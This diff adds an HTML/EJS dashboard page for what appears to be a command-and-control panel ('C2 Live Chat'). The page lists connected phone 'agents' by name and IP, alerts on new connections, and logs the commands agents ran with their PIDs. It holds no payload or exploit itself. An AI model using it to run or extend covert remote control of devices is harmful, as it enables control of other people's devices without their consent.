@@ -1,0 +1,496 @@
+```html
+<!DOCTYPE html>
+<html lang="tr" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="csrf-token" content="<%= csrfToken %>">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Agents - Firewall Panel</title>
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    :root{
+      --bg: #0f1113;
+      --card: #141619;
+      --muted: #9aa0a6;
+      --accent: #0ea5a4;
+    }
+    body {
+      background: linear-gradient(180deg, #0b0c0d 0%, #0f1113 100%);
+      color: #e6eef2;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      margin: 0;
+    }
+
+    /* Sidebar */
+    .sidebar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 220px;
+      background-color: #0d0e10;
+      border-right: 1px solid rgba(255,255,255,0.08);
+      padding: 1rem;
+      display: flex;
+      flex-direction: column;
+      z-index: 1000;
+    }
+    .sidebar .nav-link {
+      color: #ccc;
+      margin-bottom: 0.5rem;
+      border-radius: 6px;
+    }
+    .sidebar .nav-link.active,
+    .sidebar .nav-link:hover {
+      background: rgba(14,165,164,0.15);
+      color: #0ea5a4;
+    }
+    .sidebar .brand {
+      font-weight: 700;
+      color: #0ea5a4;
+      font-size: 1.2rem;
+      margin-bottom: 2rem;
+      text-decoration: none;
+    }
+
+    /* Main content */
+    .main {
+      margin-left: 220px;
+      padding: 24px;
+      min-height: 100vh;
+    }
+
+    .agent-grid {
+      display:flex;
+      flex-wrap:wrap;
+      gap:14px;
+    }
+    .agent-card {
+      width: 200px;
+      min-height: 110px;
+      padding: 14px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border: 1px solid rgba(255,255,255,0.04);
+      border-radius: 12px;
+      text-align: center;
+      color: #eaf6f6;
+      cursor: pointer;
+      transition: transform .18s ease, box-shadow .18s ease;
+      box-shadow: 0 6px 18px rgba(2,6,23,0.6);
+      position: relative;
+    }
+    .agent-card:hover { transform: translateY(-6px); box-shadow: 0 18px 48px rgba(2,6,23,0.75); }
+
+    #no-agents { color: var(--muted); }
+
+    #log-box {
+      max-height:300px;
+      overflow-y:auto;
+      background:#000;
+      color:#0f0;
+      font-family:monospace;
+      padding:10px;
+      border-radius:6px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <a href="/" class="brand">🔥 AgenPower</a>
+    <nav class="nav flex-column">
+      <a class="nav-link active" href="/">Dashboard</a>
+      <a class="nav-link" href="/agents">Agents</a>
+      <a class="nav-link" href="/logs">Logs</a>
+      <% if (!has2FA) { %>
+        <a class="nav-link text-warning" href="/2fa/setup">2FA Kur</a>
+      <% } %>
+    </nav>
+    <div class="mt-auto">
+      <div class="small text-muted mb-2">👤 <%= username %></div>
+      <a href="/logout" class="btn btn-sm btn-outline-danger w-100">Çıkış</a>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <div class="main">
+    <div id="toast-root" class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1100;"></div>
+    <h1 class="mb-4">Hoş Geldiniz, <%= username %>!</h1>
+    <div id="controls" class="d-flex mb-3">
+      <h2 class="me-auto">Connected Agents</h2>
+      <button id="toggle-sound" class="btn btn-sm btn-outline-light">Ses: Aç</button>
+    </div>
+
+    <!-- Admin Agent Search Bar -->
+    <div class="mb-4">
+      <div class="input-group">
+        <span class="input-group-text bg-dark text-info border-secondary">🔍</span>
+        <input type="text" id="agentSearchInput" class="form-control bg-dark text-light border-secondary" placeholder="Agent ara (İsim, IP, Durum, Cihaz...)" onkeyup="filterAgentsDashboard()">
+      </div>
+    </div>
+
+    <div id="agents-container" class="agent-grid">
+      <p id="no-agents" class="text-muted">No agents connected.</p>
+    </div>
+
+    <!-- Chat Card -->
+    <div class="card border-info mt-4">
+      <div class="card-header bg-dark text-info d-flex align-items-center justify-content-between">
+        <h5 class="mb-0">💬 C2 Live Chat (Genel Chat & Özel Chat)</h5>
+        <div class="d-flex align-items-center gap-2">
+          <label for="serverChatRecipient" class="small text-muted mb-0">Alıcı:</label>
+          <select id="serverChatRecipient" class="form-select form-select-sm bg-secondary text-light border-0" style="width:200px;">
+            <option value="ALL">Herkes (Genel Chat)</option>
+          </select>
+        </div>
+      </div>
+      <div class="card-body">
+        <div id="server-chat-box" style="height:200px; overflow-y:auto; background:#0b0d10; padding:12px; border-radius:8px; border:1px solid #334155;" class="mb-3">
+          <div class="text-muted small">🔒 AES-256-GCM Şifreli Canlı Sohbet Odası</div>
+        </div>
+        <div class="input-group">
+          <input type="text" id="serverChatInput" class="form-control bg-dark text-light border-secondary" placeholder="Mesajınızı yazın..." onkeypress="if(event.key==='Enter') sendServerChat()">
+          <button class="btn btn-info fw-bold" onclick="sendServerChat()">Gönder</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card border-secondary mt-4">
+      <div class="card-body">
+        <h5 class="text-light">Logs</h5>
+        <div id="log-box"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bootstrap JS -->
+
+
+<script>
+  // --- Sound handling / autoplay priming ---
+  let soundsEnabled = true;
+  let openSound = new Audio("/static/power-on.mp3");
+  let exitSound = new Audio("/static/shutdown.mp3");
+  openSound.preload = "auto";
+  exitSound.preload = "auto";
+  // Volume default
+  openSound.volume = 0.9;
+  exitSound.volume = 0.9;
+
+  // Try to prime audio context by playing muted very soon after load.
+  function primeAudio() {
+    // Some browsers require interaction; still try a muted play to nudge permission
+    try {
+      const s = new Audio("/static/power-on.mp3");
+      s.muted = true;
+      s.play().then(() => {
+        s.pause();
+        s.currentTime = 0;
+      }).catch(()=>{/*ignored*/});
+    } catch(e) {}
+  }
+
+  // Enable sound after first user interaction (respects autoplay policy)
+  function enableSoundExplicitly() {
+    // resume any suspended AudioContext (not used here but good practice)
+    if (typeof AudioContext !== 'undefined' && AudioContext.prototype.resume) {
+      try {
+        (new AudioContext()).resume().catch(()=>{});
+      } catch(e) {}
+    }
+    // Try to play short muted clip then unmute
+    openSound.muted = false;
+    exitSound.muted = false;
+    soundsEnabled = true;
+    updateSoundButton();
+    showToast("Ses açıldı", "Sistem sesleri aktif");
+  }
+
+  function disableSoundExplicitly() {
+    soundsEnabled = false;
+    updateSoundButton();
+    showToast("Ses kapatıldı", "Sistem sesleri devre dışı");
+  }
+
+  function updateSoundButton() {
+    const btn = document.getElementById('toggle-sound');
+    btn.textContent = `Ses: ${soundsEnabled ? 'Aç' : 'Kapalı'}`;
+    btn.classList.toggle('btn-success', soundsEnabled);
+  }
+
+  document.getElementById('toggle-sound').addEventListener('click', () => {
+    if (soundsEnabled) disableSoundExplicitly();
+    else enableSoundExplicitly();
+  });
+
+  // Unlock on first interaction (click/keydown/touch)
+  function firstInteractionHandler() {
+    enableSoundExplicitly();
+    window.removeEventListener('click', firstInteractionHandler);
+    window.removeEventListener('keydown', firstInteractionHandler);
+    window.removeEventListener('touchstart', firstInteractionHandler);
+  }
+  window.addEventListener('click', firstInteractionHandler);
+  window.addEventListener('keydown', firstInteractionHandler);
+  window.addEventListener('touchstart', firstInteractionHandler);
+
+  // Prime attempt
+  document.addEventListener('DOMContentLoaded', primeAudio);
+
+  // Play helpers (guards autoplay)
+  function playopenSound() {
+    if (!soundsEnabled) return;
+    openSound.currentTime = 0;
+    openSound.play().catch(()=>{/* ignore autoplay block */});
+  }
+  function playexitSound() {
+    if (!soundsEnabled) return;
+    exitSound.currentTime = 0;
+    exitSound.play().catch(()=>{/* ignore autoplay block */});
+  }
+
+  // --- Toast helper (Bootstrap 5) ---
+  function showToast(title, body) {
+    const root = document.getElementById('toast-root');
+    if (!root) return;
+    const id = 'toast-' + Date.now();
+    root.insertAdjacentHTML('beforeend', `
+      <div id="${id}" class="toast align-items-center text-bg-dark border-0 mb-2" role="alert" aria-live="assertive" aria-atomic="true">
+        <div class="d-flex">
+          <div class="toast-body">
+            <strong>${title}</strong><div style="font-size:12px;color:var(--muted)">${body}</div>
+          </div>
+          <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+        </div>
+      </div>
+    `);
+    // Initialize via bootstrap JS
+    try {
+      const el = document.getElementById(id);
+      const bsToast = bootstrap.Toast.getOrCreateInstance(el, { delay: 5000 });
+      bsToast.show();
+      // remove from DOM after hidden
+      el.addEventListener('hidden.bs.toast', () => el.remove());
+    } catch(e) {
+      // fallback remove after timeout
+      setTimeout(()=>document.getElementById(id)?.remove(), 6000);
+    }
+  }
+
+  // --- Socket.IO handling ---
+  const socket = io();
+  const container = document.getElementById('agents-container');
+  const noAgents = document.getElementById('no-agents');
+
+  // Track existing agents by name
+  const existingAgents = new Map();
+
+  const logBox = document.getElementById("log-box");
+
+  // Server Panel Live Chat
+  socket.on("chat_message", (msg) => {
+    const box = document.getElementById("server-chat-box");
+    if (!box) return;
+    const line = document.createElement("div");
+    const isPrivate = (msg.recipient && msg.recipient !== "ALL" && msg.recipient !== "GENEL");
+    line.className = "mb-1 p-2 rounded " + (isPrivate ? "bg-warning text-dark font-monospace" : "bg-dark text-light border border-secondary");
+    const time = new Date(msg.timestamp || Date.now()).toLocaleTimeString();
+    line.innerHTML = `<strong>[${time}] ${escapeHtml(msg.sender)} ${isPrivate ? '➔ ' + escapeHtml(msg.recipient) + ' (ÖZEL)' : '(GENEL)'}:</strong> ${escapeHtml(msg.message)}`;
+    box.appendChild(line);
+    box.scrollTop = box.scrollHeight;
+  });
+
+  function sendServerChat() {
+    const input = document.getElementById("serverChatInput");
+    const msg = input.value.trim();
+    if (!msg) return;
+    const recipient = document.getElementById("serverChatRecipient").value || "ALL";
+    socket.emit("server_send_chat", {
+      sender: "<%= username %>",
+      recipient,
+      message: msg
+    });
+    input.value = "";
+  }
+
+  function filterAgentsDashboard() {
+    const query = document.getElementById('agentSearchInput').value.toLowerCase().trim();
+    const cards = container.querySelectorAll('.agent-card');
+    let visibleCount = 0;
+    cards.forEach(card => {
+      const text = card.innerText.toLowerCase();
+      if (!query || text.includes(query)) {
+        card.style.display = 'block';
+        visibleCount++;
+      } else {
+        card.style.display = 'none';
+      }
+    });
+    if (noAgents) {
+      noAgents.style.display = (cards.length === 0 || visibleCount === 0) ? 'block' : 'none';
+    }
+  }
+
+  // Socket.IO'dan log eventi yakala
+  socket.on("log", (msg) => {
+    const line = document.createElement("div");
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight; // her zaman en alta kaydır
+  });
+
+  // ProcessResult eventini de log’a yaz
+  socket.on("processResult", (data) => {
+    const line = document.createElement("div");
+    line.textContent = `[${new Date(data.time).toLocaleTimeString()}] `
+      + `Agent:${data.agent} CMD:${data.cmd} PID:${data.output.pid}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  });
+
+
+
+  socket.on('agents', (agents) => {
+    // Update chat recipient dropdown
+    const recipientSelect = document.getElementById("serverChatRecipient");
+    if (recipientSelect) {
+      const curVal = recipientSelect.value;
+      recipientSelect.innerHTML = '<option value="ALL">Herkes (Genel Chat)</option>';
+      if (agents && Array.isArray(agents)) {
+        agents.forEach(a => {
+          const opt = document.createElement("option");
+          opt.value = a.name;
+          opt.innerText = "🔒 " + a.name + " (Özel Mesaj)";
+          recipientSelect.appendChild(opt);
+        });
+      }
+      if (curVal && recipientSelect.querySelector(`option[value="${curVal}"]`)) {
+        recipientSelect.value = curVal;
+      }
+    }
+
+    if (!agents || agents.length === 0) {
+      noAgents.style.display = 'block';
+      container.innerHTML = '<p id="no-agents" class="text-muted">No agents connected.</p>';
+      existingAgents.clear();
+      return;
+    }
+
+    noAgents.style.display = 'none';
+
+    // Create a set of incoming names
+    const incomingNames = new Set(agents.map(a => a.name));
+
+    // Remove stale cards
+    for (const name of Array.from(existingAgents.keys())) {
+      if (!incomingNames.has(name)) {
+        const el = document.getElementById(`agent-${cssSafe(name)}`);
+        if (el) el.remove();
+        existingAgents.delete(name);
+      }
+    }
+
+    // Add/update agents
+    agents.forEach(agent => {
+      const safeId = `agent-${cssSafe(agent.name)}`;
+      let card = document.getElementById(safeId);
+
+      if (!card) {
+        // NEW agent -> create card with attention
+        card = document.createElement('div');
+        card.id = safeId;
+        card.className = 'agent-card appear';
+        card.onclick = () => openAgent(agent.name);
+        card.innerHTML = `
+          <div class="agent-icon">📱</div>
+          <div><strong>${escapeHtml(agent.name)}</strong></div>
+          <div class="meta">${escapeHtml(agent.remote || 'N/A')}</div>
+        `;
+        container.prepend(card);
+        existingAgents.set(agent.name, agent);
+
+        // Add NEW badge then remove after time
+        const badge = document.createElement('div');
+        badge.className = 'badge-new';
+        badge.textContent = 'NEW';
+        card.appendChild(badge);
+
+        // Play sound & visual attention
+        requestAttention(card, agent);
+      } else {
+        // Update info if changed
+        const meta = card.querySelector('.meta');
+        if (meta) meta.textContent = agent.remote || 'N/A';
+        existingAgents.set(agent.name, agent);
+      }
+    });
+  });
+
+  // Close event example: remove agent card & play exit sound
+  socket.on('kapatiyoruz', (data) => {
+    try {
+      const id = `agent-${cssSafe(data.agent)}`;
+      const el = document.getElementById(id);
+      if (el) {
+        // little fade out
+        el.style.transition = 'opacity .25s, transform .25s';
+        el.style.opacity = '0';
+        el.style.transform = 'translateY(6px) scale(.98)';
+        setTimeout(()=>el.remove(), 280);
+      }
+      existingAgents.delete(data.agent);
+      playexitSound();
+      showToast('Ajan kapandı', `${data.agent} bağlantısı kesildi`);
+    } catch(e) { console.error(e); }
+  });
+
+  // Small helper to give visual+sounds
+  function requestAttention(card, agent) {
+    // add attention class
+    card.classList.add('attention');
+    // remove attention after a while but keep appear
+    setTimeout(() => card.classList.remove('attention'), 1600);
+
+    // play open sound (try)
+    playopenSound();
+
+    // show toast
+    showToast('Yeni ajan bağlandı', `${agent.name} • ${agent.remote || 'N/A'}`);
+
+    // remove NEW badge after 3s
+    const badge = card.querySelector('.badge-new');
+    if (badge) setTimeout(()=>badge.remove(), 3000);
+  }
+
+  // Utility: sanitize CSS ID creation
+  function cssSafe(s) {
+    return String(s).replace(/[^a-zA-Z0-9\-_]/g, '_');
+  }
+  // Utility: simple HTML escape
+  function escapeHtml(unsafe) {
+    if (!unsafe && unsafe !== 0) return '';
+    return String(unsafe)
+      .replaceAll('&', '&amp;')
+      .replaceAll('<', '&lt;')
+      .replaceAll('>', '&gt;')
+      .replaceAll('"', '&quot;')
+      .replaceAll("'", '&#039;');
+  }
+
+  // Open agent (navigate)
+  function openAgent(agentName) {
+    // Eğer detay modal istenirse burada açılabilir; şu an redirect
+    window.location.href = '/agent/' + encodeURIComponent(agentName);
+  }
+</script>
+
+<!-- Bootstrap JS (for toast) -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
